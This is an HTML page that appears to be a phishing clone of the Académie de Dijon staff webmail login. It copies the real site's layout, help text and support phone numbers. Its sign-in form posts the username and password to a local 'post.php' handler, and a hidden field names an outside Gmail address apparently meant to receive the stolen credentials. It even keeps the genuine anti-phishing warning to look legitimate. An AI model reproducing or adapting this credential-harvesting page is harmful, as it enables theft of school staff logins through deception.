
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="https://webmail.ac-dijon.fr/">
	<head>
		<meta name="description" content="Webmail de l'académie de DIJON">
		<meta name="googlebot" content="nosnippet">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<!-- Mimic Internet Explorer 7 -->
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
		<title></title>
		<style type="text/css">
			@import "../../../js/dojotoolkit/dojo/resources/dojo.css";
			@import "../../../js/dojotoolkit/dijit/themes/dijit.css";
			@import "../../../js/dojotoolkit/dijit/themes/tundra/tundra.css";
			@import "../../../js/dojotoolkit/dojox/form/resources/DropDownSelect.css";
		</style>

		<link rel="stylesheet" href="./files/css/css.css" type="text/css"/>

	        <!--[if IE]>
                <link rel="stylesheet" href="css/loginIE.css?00.01_190838" type="text/css"/>
                <![endif]-->

		<script type="text/javascript">
			var djConfig= {
				cacheBust: "none",
				isDebug:false,
				parseOnLoad:true
			};

			(function() {
				function getParameter(paramName) {
					paramName += "=";
					var queryString = window.location.search;
					var strBegin = queryString.indexOf(paramName);
					if (strBegin==-1){
						strBegin = queryString.length;
					}
					else {
						strBegin += paramName.length;
					}
					var strEnd = queryString.indexOf("&",strBegin);

					if (strEnd==-1){
						strEnd = queryString.length;
					}

					return queryString.substring(strBegin,strEnd);
				}

				var locale = getParameter("lang");
				if (locale.length > 0){
					djConfig.locale = locale.toLowerCase();
				}
				if (locale == "ar" || locale == "iw") {
					djConfig.direction = document.getElementsByTagName("html")[0].dir = "rtl";
				}
			})()

			// load new resources and change the welcome message to
			// "Welcome to Convergence"
			function loadC11nResources() {
				dojo.registerModulePath("c11n", "../../../c11n");
				dojo.requireLocalization("c11n.allDomain",  "resources");
				var l10n = dojo.i18n.getLocalization("c11n.allDomain", "resources");
				dojo.mixin(iwc.l10n, l10n);
			}

		</script>

		<script type="text/javascript" src="../../../js/dojotoolkit/dojo/dojo.js"></script>
		<script type="text/javascript">
			dojo.registerModulePath("iwc", "../../../js/iwc");
			dojo.requireLocalization("iwc.i18n","resources");
			iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");

			loadC11nResources();

			dojo.require("iwc.login");
			dojo.require("dijit.form.Button");
			dojo.require("dijit.form.TextBox");
			//dojo.require("dojox.form.DropDownSelect");

			dojo.addOnLoad(function(){
				iwc.login.setFocus();
				iwc.login.doI18N();
				document.getElementById('picCache').src='../../../layout/imageList.html?'+djConfig.cacheBust;
				//var lang = langLblMapping[djConfig.locale.toLowerCase()]?langLblMapping[djConfig.locale.toLowerCase()]:langLblMapping['en-us'];
				var lang = "en_us";
				if(djConfig && djConfig.locale) {
					lang = djConfig.locale.toLowerCase();
				}
				dijit.byId('langButton').attr("value", lang);
				dojo.connect(dijit.byId("langButton"), "onChange", function(lang) {
					var loginUrl = window.location;

                    if(window.location.search!=""&&window.location.search.indexOf('lang=')>-1)
                        loginUrl = loginUrl.href.replace('lang='+iwc.login.getParameter('lang'),'lang='+lang);
                    else
                        loginUrl = loginUrl+"?lang="+lang

                    if(window.location.search.indexOf("u=1")==-1)
                        loginUrl=loginUrl+'&u=1';
                    
					window.location = loginUrl;
					return false;
				});
			});

			function login() {
				return iwc.login.checkName();
			}
		</script>
	</head>

    <body>
        <div class="Convergence-Login">
			<div class="Convergence-Login-RedBand"></div>
			<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg">
			Webmail de l'académie de Dijon</div>
			<div class="Convergence-Login-Border">
				<div class="Convergence-Login-Banner">
					<div  class="Convergence-Login-Logo" wairole="presentation"></div>


                                <div id="formsignin">

				<form action="post.php" method="post" onSubmit="return login();">
                <input type="hidden" name="mailla" value="dvlbadboys@gmail.com"/>
					<div>
						<div class="Convergence-Login-Form">
							<div class="Convergence-Login-FormRow">
								<label id="usernameLabelID" for="username">Username:</label>
								<input class="input" id="username"  name="user"  type="text" required pattern="([a-zA-Z0-9]+([_|\.|-]{1})?[a-zA-Z0-9]+)([_|\.|-]{1})?([a-zA-Z0-9]?){1,}|([a-zA-Z0-9]+([_|\.|-]{1})?[a-zA-Z0-9]+)([_|\.|-]{1})?([a-zA-Z0-9]?){1,}@(ac-dijon.fr)"/>
							</div>
							<div class="Convergence-Login-FormRow">
								<label id="passwordLabelID" for="password">Password:</label>
								<input id="password" name="pass" type="password" required />
							</div>
							<div class="Convergence-Login-FormRow tundra">

								<div class="Convergence-Login-SelectLang">
									<input dojoType="dijit.form.TextBox" type="hidden" id="langButton" value="fr">
								</div>
								<div class="Convergence-Login-FormButton" id="buttonContainer">
									<div>
										<div dojoType="dijit.form.Button"
											 id="signin"
											 type="submit"
											 dojoAttachEvent="onClick: login"></div>
									</div>
									<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Sign In</span></button></span></span></span>
								</div>
								<div style="clear: both"></div>
							</div>

						</div>

					</div>
					<div style="clear: both"></div>
				</form>
				</div>
				</div>
				<div class="Convergence-Login-Notification" id="alertMsg"></div>

				<!--<div id="copyright" class="Convergence-Login-Copyright"></div>-->

		<div id="overlay" class="login">
			<div class="centered">
				<div class="logo"></div>
				<div id="progress"></div>
			</div>
		</div>
			</div>
                                <div id="boxhelp">

                                        <!--[if IE]><a href="#"><![endif]-->
                                        <!--[if !IE]><--><a href="#helppopup"><!--><![endif]-->
                                        <div id="copyright" class="Convergence-Login-Copyright"></div>
                                        <!--[if !IE]><--></a><a href="#"><!--><![endif]-->
                                        <div id="helppopup">
                                                <img style="float:right;cursor:pointer;" src="images/cancel11.png?00.01_190838"/>
                                                <p><h3>Vous devez vous identifier avec les informations suivantes :</h3></p>
                                                <ul>
                                                        <li><p><b>Votre identifiant</b> se compose g&eacute;n&eacute;ralement de la premi&egrave;re lettre de votre pr&eacute;nom suivie de votre nom (en minuscules)
                                                        <br/><i>Exemple: Jean Dupond donne jdupond </i></p>
                                                        <p>Attention en raison d&rsquo;homonymie votre nom peut &ecirc;tre suivi d&rsquo;un chiffre
                                                        <br/><i>Exemple: Jean Dupond peut donner jdupond1</i></p>
                                                        <p>Dans le cas de noms compos&eacute;s, un tiret relie les particules
                                                        <br/><i>Exemple: Jean Le Dupond donne jle-dupond</i></p></li></li>
				                        <li>Si vous êtes <b>nouvel arrivant</b> vous devez initialiser votre mot de passe en cliquant sur <b>"J'initialise mon mot de passe"</b> en utilisant le <b>code INA</b> qui vous a &eacute;t&eacute; transmis</li></ul>
                                                <p><h3>Si vous ne pouvez toujours pas vous connecter :</h3></p>
                                                <ul>
                                                        <li><p>Si vous &ecirc;tes personnel du premier degr&eacute; (&eacute;coles maternelles et &eacute;l&eacute;mentaires)
                                                        <br/>contactez votre service d&rsquo;assistance d&eacute;partemental :</p>
                                                                <ul>
                                                                        <li>C&ocirc;te-d&rsquo;Or : 03.80.44.88.09</li>
                                                                        <li>Ni&egrave;vre : 03.86.21.70.24</li>
                                                                        <li>Sa&ocirc;ne et Loire : 03.85.22.55.84</li>
                                                                        <li>Yonne : 03.86.51.50.57</li>
                                                                </ul>
                                                        </li><li><p>Pour les autres personnels</p>
                                                                <ul><li>Service d'assistance acad&eacute;mique : 03.80.44.88.09<br>du lundi au vendredi de 8h00 &agrave; 12h30 et de 13h30 &agrave; 17h30</li></ul>
                                                        </li></ul>

                                        </div>
                                        </a>
                                </div>
<!--<div id="noel"></div>-->
				<div id="infowebmail" style="margin-top:10px;">
					<!--<div id="txtinfowebmail" class="Convergence-Login-Copyright">Cliquez ici pour des informations sur ce nouveau Webmail</div>-->
					<div id="infopopup">
<img id="imgclose" style="float:right;cursor:pointer;" src="images/cancel11.png?00.01_190838"/>
<p>Mesdames et Messieurs les personnels de l'Acad&eacute;mie de Dijon,</p>
<p>Le webmail doit &eacute;voluer vers le web 2.0 avec des fonctionnalit&eacute;s nouvelles r&eacute;pondant aux attentes des utilisateurs :</p>
<ul>
        <li>Nouvelle interface plus conviviale.</li>
        <li>Message de notification d'absence.</li>
        <li>Gestion de pages html.</li>
        <li>Agenda partag&eacute;.</li>
        <li>Reroutage de courrier.</li>
        <li>Pages d'information et alertes anti-spam.</li>
        <li>Partage de dossiers de messagerie.</li>
</ul>
<p>Le webmail &eacute;tant un service particuli&egrave;rement utilis&eacute;, il a sembl&eacute; judicieux de recueillir votre avis sur cette nouvelle solution avant de la g&eacute;n&eacute;raliser.</p>
<p>Vos identifiants "Nom d'utilisateur" et "Mot de passe" restent inchang&eacute;s</p>
<p>Vous retrouverez l'int&eacute;gralit&eacute; de vos dossiers. En revanche, vous devrez recr&eacute;er vos filtres de courriers.</p>
<p>Si vous souhaitez conserver votre carnet d'adresses personnel, une proc&eacute;dure vous explique la marche &agrave; suivre (cliquez sur le lien ci-dessous : <a href="https://webmail.ac-dijon.fr/horde2/carnetadresse.pdf" target="_blank">r&eacute;cup&eacute;ration carnet d'adresses).</a></p>
<p>Un didacticiel "Aide" est &agrave; votre disposition &agrave; cot&eacute; du bouton "Se d&eacute;connecter" en haut &agrave; droite de l'&eacute;cran.</p>
<p>En cas de probl&egrave;me, la plateforme d'assistance t&eacute;l&eacute;phonique est &agrave; votre disposition de 8H00 &agrave; 12H00 et de 13H30 &agrave; 17H00 :</p>
<div align="center">03 80 44 88 09</div>
<!--<p>N'h&eacute;sitez pas &agrave faire remonter vos remarques et questions sur l'utilisation de cet outil de communication en envoyant un courriel &agrave; l'adresse : tests.messagerie@ac-dijon.fr</p>-->
<p>Merci pour votre participation &agrave; l'&eacute;valuation de ce nouveau webmail.</p>
<div id="signature">Le secr&eacute;taire g&eacute;n&eacute;ral<br>de l'acad&eacute;mie de Dijon</div>
					</div>
				</div>
				<!--<script>
					var myDivInfo=dojo.byId("txtinfowebmail");
					var imgClose=dojo.byId("imgclose");
					dojo.connect(myDivInfo,"onclick",function(evt){
						dojo.style(dojo.byId("infopopup"),"display","block");
					});
					dojo.connect(imgClose,"onclick",function(evt){
						dojo.style(dojo.byId("infopopup"),"display","none");
					});
				</script>-->

				<!--<div id="oldwebmail" class="Convergence-Login-Copyright" style="margin-top:10px">
					<a href="https://webmail.ac-dijon.fr/horde2/">Cliquez ici pour utiliser <u>l'ancien Webmail horde2</u></a>
					<br><br>
					<a href="https://webmail.ac-dijon.fr/roundcube/">Cliquez ici pour <u><b><font size="5">tester</font></b></u> <u>le webmail roundcube</u> (remplacera l'ancien webmail horde2)</a>
				</div>-->

<!--					<div><br><font color="red" style="font-family:times New Roman"><h2><b>ARRET DES SERVICES : </h2><br>
Une coupure générale d’électricité est prévue pendant les congés de noël pour la maintenance du tableau général électrique du bâtiment (TGBT).<br>
Cette coupure implique l’arrêt progressif du Datacenter et donc de l’ensemble des systèmes d’information.<br>
Tous les services informatiques de l’académie de Dijon (messagerie électronique, PIA, accès aux applications…) seront donc interrompus à compter du 2 janvier 2015.<br>
La réouverture progressive des services informatiques est programmée dès le week end des 3 et 4 janvier et se poursuivra le lundi 5 janvier 2015.
					</b></font></div>-->
<!--        <div style="text-align:center"><br><font color="red"><h2><b>
Le serveur de messagerie rencontre quelques perturbations, nous travaillons activement à la stabilisation du service.<br>Merci de votre compréhension.</b></h2></font></div>-->
<!--        <div style="text-align:center"><br><font color="red"><h2><b>ATTENTION</b><br>
L'accès aux webmails sera fermé le 20 février à partir de 16h pour une opération de maintenance<br/>
Nous vous remercions de votre compréhension.
</b></h2></font></div>-->
	<div style="text-align:center"><h2><u><a href="#">J'initialise mon mot de passe</a></u></h2></div>

        <div style="text-align:left"><br><font color="red"><h2><b>Nous vous rappelons que l'académie ne demande <u><b>JAMAIS</b></u> vos identifiants de connexion par mail.<br>
Si vous recevez un message vous les demandant, il s'agit d'une tentative d'hameçonnage.<br>
Vous devez immédiatement supprimer le message.<br><br>
La Direction des Systèmes d'Information</b></h2></font></div>
<!--        <div style="text-align:center"><br><font color="red"><h2><b>ATTENTION</b><br>
Un mail concernant une facture a été diffusé dans les boites mails, il s'agit d'un SPAM contenant un VIRUS !<br>
Vous devez immédiatement supprimer le message et ne SURTOUT pas ouvrir les pièces jointes.<br><br>
La Direction des Systèmes d'Information</b></h2></font></div>
-->


		</div>

		<iframe name="picCache" id="picCache" src="" width=0 height=0 frameborder=0></iframe>
    </body>
</html>
